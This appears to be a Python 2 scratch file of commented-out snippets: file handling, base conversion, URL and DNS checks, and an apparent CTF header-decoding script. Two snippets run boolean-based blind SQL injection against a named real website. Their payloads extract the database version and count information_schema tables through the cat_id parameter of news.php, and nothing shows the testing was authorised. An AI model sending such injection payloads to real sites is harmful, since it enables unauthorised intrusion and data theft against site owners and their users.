# import os

# # print os.path.isdir("goal")
# if os.path.isdir("test1") == False:
#     os.mkdir("test1")

# name = os.getcwd() + "\\" + "test1\\" + "test.txt"
# result = [[1 for col in range(4)] for row in range (5)]
# fp1 = open(name,'w+')
# for i in result:
#     temp = str(i)
#     fp1.writelines(temp+'\n')

# fp1.close()

# strs = "18200391305"
# nums = dict()
# for i in xrange(10):
#     nums[i] = strs.count(str(i))
# for x in nums.items(): 
#     print x

# nums = sorted(nums.iteritems(), key=lambda x: x[1])
# for i in nums:
#         print "{num}: {count}".format(num=i[0], count=i[1])

#! /usr/bin/env python
# -*- coding=utf-8 -*- 
# @Author pythontab.com
# import urllib2
# url="http://www.meclub.hk/news.php?cat_id=if(ascii(substr((version()),6,1))=53,1,0)"
# req_header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
# 'Accept':'text/html;q=0.9,*/*;q=0.8',
# 'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
# 'Accept-Encoding':'gzip',
# 'Connection':'close',
# 'Referer':'None'
# }
# req_timeout = 5
# #req = urllib2.Request(url,None,req_header)
# print 1
# try:
#     response = urllib2.urlopen(url)
#     print response.getcode()
#     if 200 == response.getcode():
#         print url
#         #return 0
# except urllib2.HTTPError, e:
#     print 2
#     e.message
#print dict(response.headers).get('content-length')

#!/usr/bin/env python  
# -*- coding: utf-8 -*-  
# import httplib
# import urllib


 
# def sendhttp():
#     data = urllib.urlencode({'@number': 12524, '@type': 'issue', '@action': 'show'})   
#     headers = {"Content-type": "application/x-www-form-urlencoded",
#                "Accept": "text/plain"}
#     conn = httplib.HTTPConnection('www.meclub.hk')
#     conn.request('GET', '/news.php?cat_id=if(ascii(substr( (select (select count(*) from information_schema.tables where table_schema="MeClub")),1,1))>53,1,0)')
#     httpres = conn.getresponse()
#     #print httpres.getheader('content-length')
#     # print httpres.status
#     # print httpres.reason
#     print len(httpres.read())
#     print httpres.read()
           
              
# if __name__ == '__main__':  
#     sendhttp() 


# import getopt, sys

# def usage(output):
#     print output

# def main():
#     try:
#         opts, args = getopt.getopt(sys.argv[1:], "hO:v", ["help", "output="])
#     except getopt.GetoptError as err:
#         # print help information and exit:
#         print(err) # will print something like "option -a not recognized"
#         usage()
#         sys.exit(2)
#     output = None
#     verbose = False
#     for o, a in opts:
#         if o == "-v":
#             verbose = True
#         elif o in ("-h", "--help"):
#             usage()
#             sys.exit()
#         elif o in ("-O", "--output"):
#             output = a
#             result = {
#                 '123' : lambda : usage(a)
#             }[a]()
            
#         else:
#             assert False, "unhandled option"
#     # ...

# if __name__ == "__main__":
#     main()

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 2/10/16 base trans. wrote by srcdog on 20th, April, 2009
# ld elements in base 2, 10, 16.

# import os,sys


# base = [str(x) for x in range(10)] + [ chr(x) for x in range(ord('A'),ord('A')+6)]


# def bin2dec(string_num):
#     return str(int(string_num, 2))

# def hex2dec(string_num):
#     return str(int(string_num.upper(), 16))


# def dec2bin(string_num):
#     num = int(string_num)
#     mid = []
#     while True:
#         if num == 0: break
#         num,rem = divmod(num, 2)
#         mid.append(base[rem])

#     return ''.join([str(x) for x in mid[::-1]])


# def dec2hex(string_num):
#     num = int(string_num)
#     mid = []
#     while True:
#         if num == 0: break
#         num,rem = divmod(num, 16)
#         mid.append(base[rem])

#     return ''.join([str(x) for x in mid[::-1]])

# def hex2bin(string_num):
#     return dec2bin(hex2dec(string_num.upper()))


# def bin2hex(string_num):
#     return dec2hex(bin2dec(string_num))

# def bin2asc(string_num):
#     return dec2hex(bin2dec(string_num)).decode('hex')

# if __name__ == '__main__':
#     fp = open('1.txt','r')
#     fp1 = open('temp.txt', 'w+')
#     i = 1
#     while True:
#         temp = fp.readline()
#         if not temp:
#             break
#         re = bin2asc(temp)
#         # if i == 8:
#         #     fp1.write(re+'\n')
#         #     i = i + 1
#         # else :
#         fp1.write(re)
# #             # i = 1
# #     fp.close
# #     fp1.close

# import urllib
# import httplib 
# test_data = {
#     'Pragma':'no-cache',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
#     'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',
#     'Referer': 'http://who.is/',
#     'Accept-Encoding': 'gzip, deflate, sdch',
#     'Accept-Language': 'zh-CN,zh;q=0.8'
#     'Connection':'keep-alive'
# }
# test_data_urlencode = urllib.urlencode(test_data)

# requrl = "http://118.123.249.64:8082/Home/Praise/23"
# headerdata = {"Host":"118.123.249.64:8082"}

# conn = httplib.HTTPConnection("118.123.249.64")

# conn.request(method="POST",url=requrl,body=test_data_urlencode,headers = headerdata) 

# response = conn.getresponse()

# res= response.read()

# print res

# import urllib2
# import time
# import base64

# url = 'http://222.18.158.229:10000/'
# arry = []


# def duang():
#     result = ''
#     for i in range(0,10):
#         response = urllib2.urlopen(url)
#         temp = dict(response.headers).get('surprise')
#         print temp
#         arry.insert(int(temp[:temp.find(' ')])-1,temp[2:])
#         time.sleep(6)
#     for i in range(0,10):
#         result = result + arry[i]
#     print result
#     result = base64.b64decode(str(result))
#     print result

# if __name__ == '__main__':
#     duang()

# import urllib2


# def testURL():
#     fp1 = open('url.txt')

#     for line in fp1.readlines():
#         print line
#         try:
#             response = urllib2.urlopen('http://' + line)
#             code = response.getcode()
#             print code
#         except Exception, e:
#             print str(code) + str(e)

#     fp1.close()

# if __name__ == '__main__':
#     testURL()
#     
# import socket
# fp=open("C:\Users\Lvmaple9527\Desktop\sd.txt")
# for url in fp.readlines():
#     url = url.strip()
#     try:
#         ip = socket.gethostbyname(url)
#         # print url+"--"+ip
#         print ip
#     except Exception, e:
#         # print url+"--error"
#         print "error"
#         pass
# fp.close()

# a = 1
# b = "2"

# def hehe():
#     print a
#     if a == 1:
#         print a
#     c = a + 1
#     b = b + "1"
#     print c
#     print a+1
#     print b

# hehe()

import os

sep = os.sep
rootdir = "." + sep

for dirpaths, dirs, fnames in os.walk(rootdir):
    # print dirpaths
    # print dirs

    for fname in fnames: 
        print os.path.join(dirpaths, fname)

print "=========="
print [i for i in os.listdir(".") if not os.path.isdir(i)]